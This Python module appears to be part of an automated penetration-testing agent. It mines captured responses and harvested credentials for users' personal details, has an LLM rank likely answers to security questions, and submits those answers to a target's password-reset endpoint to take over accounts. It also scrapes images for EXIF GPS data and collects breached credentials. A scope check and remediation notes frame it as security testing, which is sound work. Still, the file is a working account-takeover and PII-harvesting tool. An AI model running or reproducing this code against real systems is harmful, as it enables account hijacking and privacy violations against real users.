"""P4: Identity Intelligence — in-app user content analysis for security question answering."""
from __future__ import annotations

import json
import logging
import re
import uuid
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

_SECURITY_QUESTION_RE = re.compile(
    r'(?:security.?question|secret.?question|challenge.?question|verification.?question|'
    r'what\s+is\s+your|mother.?s?\s+maiden|first\s+pet|favorite\s+|'
    r'birth(?:place|city|town)|elementary\s+school|high\s+school|'
    r'childhood|best\s+friend|street\s+(?:you|where)|'
    r'first\s+car|dream\s+job)',
    re.IGNORECASE,
)

_PII_PATTERNS = {
    "email": re.compile(r'[\w.+-]+@[\w-]+\.[\w.]+'),
    "phone": re.compile(r'\b(?:\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b'),
    "location": re.compile(r'\b(?:lives?\s+in|from|located\s+in|based\s+in|born\s+in)\s+([A-Z][a-z]+(?:\s+[A-Z][a-z]+)*)', re.IGNORECASE),
    "name": re.compile(r'\b(?:name\s+is|my\s+name|called)\s+([A-Z][a-z]+(?:\s+[A-Z][a-z]+)?)', re.IGNORECASE),
    "pet": re.compile(r'\b(?:my\s+(?:dog|cat|pet|fish|bird|hamster|rabbit)\s+(?:is\s+)?(?:named|called)?\s*)([A-Z]?\w+)', re.IGNORECASE),
    "date": re.compile(r'\b(?:birthday|born\s+on|anniversary)\s*(?:is\s+)?(\d{1,2}[/-]\d{1,2}[/-]\d{2,4})', re.IGNORECASE),
}


@dataclass
class UserProfile:
    user_id: str = ""
    email: str = ""
    username: str = ""
    display_name: str = ""
    locations: List[str] = field(default_factory=list)
    names_mentioned: List[str] = field(default_factory=list)
    interests: List[str] = field(default_factory=list)
    pets: List[str] = field(default_factory=list)
    dates: List[str] = field(default_factory=list)
    content_snippets: List[str] = field(default_factory=list)
    security_questions: List[str] = field(default_factory=list)


class IdentityIntelligence:
    def __init__(self, ctx=None, llm_client=None):
        self.ctx = ctx
        self.llm_client = llm_client
        self._findings: List[Dict[str, Any]] = []
        self._profiles: List[UserProfile] = []

    async def _get_llm(self):
        if self.llm_client:
            return self.llm_client
        from agents.universal_llm_harness import get_llm_client
        self.llm_client = get_llm_client()
        return self.llm_client

    def extract_user_profiles(self) -> List[UserProfile]:
        """Extract user identity information from all context sources."""
        profiles: Dict[str, UserProfile] = {}

        if not self.ctx:
            return []

        # From harvested credentials — get user identifiers
        for cred in (getattr(self.ctx, "harvested_creds", []) or []):
            if not isinstance(cred, dict):
                continue
            uid = cred.get("username", cred.get("email", cred.get("user_id", "")))
            if uid and uid not in profiles:
                profiles[uid] = UserProfile(
                    user_id=uid,
                    email=cred.get("email", ""),
                    username=cred.get("username", ""),
                )

        # From captured responses — extract user content (reviews, profiles, comments)
        for req in (getattr(self.ctx, "captured_requests", []) or []):
            if not isinstance(req, dict):
                continue
            resp_body = req.get("response_body", req.get("response", ""))
            if not isinstance(resp_body, str) or len(resp_body) < 50:
                continue

            # Try to parse as JSON for structured user data
            try:
                data = json.loads(resp_body)
                if isinstance(data, dict):
                    self._extract_from_json(data, profiles)
                elif isinstance(data, list):
                    for item in data[:20]:
                        if isinstance(item, dict):
                            self._extract_from_json(item, profiles)
            except (json.JSONDecodeError, TypeError):
                pass

            # Regex extraction from raw text
            self._extract_pii_from_text(resp_body, profiles)

        # From brain_log — security questions
        for line in (getattr(self.ctx, "brain_log", []) or []):
            if _SECURITY_QUESTION_RE.search(str(line)):
                for profile in profiles.values():
                    profile.security_questions.append(str(line)[:200])

        self._profiles = list(profiles.values())
        logger.info(f"[IdentityIntel] Extracted {len(self._profiles)} user profiles")
        return self._profiles

    def _extract_from_json(self, data: Dict, profiles: Dict[str, UserProfile]) -> None:
        """Extract identity clues from a JSON object."""
        uid = str(data.get("user_id", data.get("userId", data.get("id", data.get("email", "")))))
        if not uid:
            return

        profile = profiles.setdefault(uid, UserProfile(user_id=uid))

        for key in ("email", "mail", "emailAddress"):
            if key in data and isinstance(data[key], str):
                profile.email = data[key]

        for key in ("username", "user_name", "login"):
            if key in data and isinstance(data[key], str):
                profile.username = data[key]

        for key in ("name", "display_name", "displayName", "full_name", "fullName"):
            if key in data and isinstance(data[key], str):
                profile.display_name = data[key]
                profile.names_mentioned.append(data[key])

        for key in ("city", "location", "address", "state", "country", "birthplace"):
            if key in data and isinstance(data[key], str):
                profile.locations.append(data[key])

        # User-generated content (reviews, comments, bio)
        for key in ("review", "comment", "bio", "about", "description", "feedback",
                     "message", "text", "content", "body"):
            if key in data and isinstance(data[key], str) and len(data[key]) > 10:
                profile.content_snippets.append(data[key][:500])

    def _extract_pii_from_text(self, text: str, profiles: Dict[str, UserProfile]) -> None:
        """Extract PII from raw text using regex patterns."""
        # Use first profile or create anonymous
        target_profile = next(iter(profiles.values())) if profiles else None
        if not target_profile:
            return

        for category, pattern in _PII_PATTERNS.items():
            for match in pattern.finditer(text[:5000]):
                value = match.group(1) if match.lastindex else match.group(0)
                if category == "location":
                    target_profile.locations.append(value)
                elif category == "pet":
                    target_profile.pets.append(value)
                elif category == "name":
                    target_profile.names_mentioned.append(value)
                elif category == "date":
                    target_profile.dates.append(value)

    async def answer_security_questions(self, profile: UserProfile) -> List[Dict[str, str]]:
        """Use LLM to answer security questions from gathered identity clues."""
        if not profile.security_questions:
            return []

        llm = await self._get_llm()
        answers = []

        clues = {
            "name": profile.display_name,
            "email": profile.email,
            "locations": profile.locations[:5],
            "names_mentioned": profile.names_mentioned[:10],
            "pets": profile.pets[:5],
            "dates": profile.dates[:5],
            "interests": profile.interests[:10],
            "content": [s[:200] for s in profile.content_snippets[:5]],
        }

        for question in profile.security_questions[:5]:
            prompt = (
                f"Given these identity clues about a user:\n"
                f"{json.dumps(clues, default=str, indent=2)}\n\n"
                f"Security question: {question}\n\n"
                f"Generate the 5 most likely answers, ranked by probability. "
                f"Respond as JSON: {{\"answers\": [\"most likely\", \"second\", ...]}}"
            )

            try:
                from core.common.schemas import TaskTier
                resp = await llm.generate_response(
                    prompt,
                    tier=TaskTier.SMALL,
                    temperature=0.3,
                )
                text = resp.content
                if "```json" in text:
                    text = text.split("```json")[1].split("```")[0]
                elif "```" in text:
                    text = text.split("```")[1].split("```")[0]
                data = json.loads(text)
                candidates = data.get("answers", [])
                if candidates:
                    answers.append({
                        "question": question,
                        "candidates": candidates[:5],
                    })
            except Exception as e:
                logger.debug(f"[IdentityIntel] Security question answering failed: {e}")

        return answers

    async def attempt_password_reset(self, profile: UserProfile,
                                      answers: List[Dict[str, str]]) -> List[Dict[str, Any]]:
        """Try security question answers on password reset flow."""
        findings = []
        target = getattr(self.ctx, "target", "") if self.ctx else ""
        if not target or not answers:
            return findings

        # Scope check
        try:
            from core.security.authorization import TargetScopeValidator
            host = urlparse(target).hostname
            if host and not TargetScopeValidator.get().is_authorized(host):
                return findings
        except Exception:
            return findings

        # Look for password reset endpoint in captured requests
        reset_url = ""
        reset_method = "POST"
        for req in (getattr(self.ctx, "captured_requests", []) or []):
            if not isinstance(req, dict):
                continue
            url = req.get("url", "").lower()
            if any(kw in url for kw in ("reset", "forgot", "recover", "security-question")):
                reset_url = req.get("url", "")
                reset_method = req.get("method", "POST")
                break

        if not reset_url:
            return findings

        from core.network.broker import NetworkBroker
        broker = NetworkBroker()

        for qa in answers:
            for candidate in qa.get("candidates", [])[:3]:
                try:
                    body = json.dumps({
                        "email": profile.email or profile.username,
                        "security_answer": candidate,
                        "answer": candidate,
                    })
                    resp = await broker.send_request(
                        method=reset_method, url=reset_url,
                        headers={"Content-Type": "application/json"},
                        body=body, timeout=10,
                    )
                    if resp.status_code in (200, 201, 204):
                        resp_body = str(resp.text or resp.body or "").lower()
                        if any(kw in resp_body for kw in ("reset link", "password changed",
                                                           "success", "token", "new password")):
                            findings.append({
                                "finding_id": str(uuid.uuid4()),
                                "title": f"Security Question Bypass: {profile.email or profile.username}",
                                "type": "Weak Password Recovery",
                                "description": (
                                    f"Security question answered using in-app user content. "
                                    f"Question: {qa['question'][:80]}, Answer: {candidate}"
                                ),
                                "severity": "CRITICAL",
                                "confidence_score": 0.9,
                                "target": target,
                                "location": reset_url,
                                "evidence": f"Answer '{candidate}' accepted for reset",
                                "cwe": "CWE-640",
                                "source": "identity_intel",
                                "tool": "p4_identity_intel",
                                "attack_type": "security_question_bypass",
                                "status": "confirmed",
                                "remediation": (
                                    "Remove security questions as a recovery mechanism. "
                                    "Use email/SMS-based recovery with time-limited tokens."
                                ),
                            })
                            self._findings.append(findings[-1])
                            return findings  # One success is enough
                except Exception as e:
                    logger.debug(f"[IdentityIntel] Reset attempt failed: {e}")

        return findings

    async def analyze_photos(self) -> List[Dict[str, Any]]:
        """Check user-uploaded images for EXIF metadata leakage."""
        findings = []
        if not self.ctx:
            return findings

        # Look for image URLs in responses
        image_urls = set()
        for req in (getattr(self.ctx, "captured_requests", []) or []):
            if not isinstance(req, dict):
                continue
            resp_body = req.get("response_body", req.get("response", ""))
            if isinstance(resp_body, str):
                for match in re.finditer(r'https?://[^\s"\'<>]+\.(?:jpg|jpeg|png|gif|webp|tiff)', resp_body, re.IGNORECASE):
                    image_urls.add(match.group(0))

        if not image_urls:
            return findings

        from core.network.broker import NetworkBroker
        broker = NetworkBroker()

        for img_url in list(image_urls)[:10]:
            try:
                # Scope check
                host = urlparse(img_url).hostname
                from core.security.authorization import TargetScopeValidator
                if host and not TargetScopeValidator.get().is_authorized(host):
                    continue

                resp = await broker.send_request(method="GET", url=img_url, timeout=15)
                body = resp.body if hasattr(resp, "body") else b""
                if isinstance(body, bytes) and len(body) > 100:
                    # Check for EXIF GPS data (simplified — look for GPS IFD marker)
                    if b"GPS" in body or b"\x00\x01\x00\x02" in body:
                        findings.append({
                            "finding_id": str(uuid.uuid4()),
                            "title": f"EXIF Metadata Exposure: {img_url.split('/')[-1]}",
                            "type": "Information Disclosure (EXIF)",
                            "description": f"Image at {img_url} contains EXIF metadata including potential GPS coordinates",
                            "severity": "MEDIUM",
                            "confidence_score": 0.7,
                            "target": getattr(self.ctx, "target", ""),
                            "location": img_url,
                            "evidence": "EXIF GPS data detected in image bytes",
                            "cwe": "CWE-200",
                            "source": "identity_intel",
                            "tool": "p4_identity_intel",
                            "attack_type": "exif_leak",
                            "status": "confirmed",
                            "remediation": "Strip EXIF metadata from user-uploaded images before serving.",
                        })
                        self._findings.append(findings[-1])
            except Exception:
                pass

        return findings

    async def run_full_analysis(self) -> List[Dict[str, Any]]:
        """Run complete identity intelligence pipeline."""
        profiles = self.extract_user_profiles()

        # EXIF analysis
        await self.analyze_photos()

        # Security question answering for each profile
        for profile in profiles[:5]:
            if profile.security_questions:
                answers = await self.answer_security_questions(profile)
                if answers:
                    await self.attempt_password_reset(profile, answers)

        # Also run existing OSINT engine if available
        try:
            from core.intelligence.osint_engine import OSINTEngine
            target = getattr(self.ctx, "target", "")
            if target:
                domain = urlparse(target).hostname or ""
                if domain:
                    osint = OSINTEngine()
                    from core.intelligence.osint_engine import derive_company_name
                    osint_results = await osint.run_full_osint(domain, derive_company_name(domain))
                    leaked = osint_results.get("leaked_credentials", [])
                    if leaked:
                        self._findings.append({
                            "finding_id": str(uuid.uuid4()),
                            "title": f"Leaked Credentials Found: {len(leaked)} entries",
                            "type": "Credential Exposure",
                            "description": f"{len(leaked)} credential entries found in breach databases for {domain}",
                            "severity": "HIGH",
                            "confidence_score": 0.8,
                            "target": target,
                            "evidence": f"{len(leaked)} leaked credentials",
                            "cwe": "CWE-521",
                            "source": "identity_intel",
                            "tool": "p4_identity_intel",
                            "attack_type": "credential_leak",
                            "status": "confirmed",
                            "remediation": "Force password resets for affected accounts. Implement breach detection monitoring.",
                        })
        except Exception as e:
            logger.debug(f"[IdentityIntel] OSINT engine unavailable: {e}")

        # Enrich all findings with LLM-derived CWE, severity, remediation
        if self._findings:
            try:
                from core.reporting.finding_factory import get_finding_factory
                await get_finding_factory().enrich_batch(self._findings)
            except Exception as e:
                logger.debug(f"[IdentityIntel] Batch enrichment failed: {e}")

        logger.info(f"[IdentityIntel] Complete: {len(self._profiles)} profiles, "
                    f"{len(self._findings)} findings")
        return self._findings

    @property
    def findings(self) -> List[Dict[str, Any]]:
        return self._findings

    def stats(self) -> Dict[str, Any]:
        return {
            "profiles_extracted": len(self._profiles),
            "findings": len(self._findings),
        }


async def run_identity_intel(ctx) -> List[Dict[str, Any]]:
    """Convenience function for central_brain integration."""
    if not getattr(ctx, "target", ""):
        return []
    intel = IdentityIntelligence(ctx=ctx)
    return await intel.run_full_analysis()
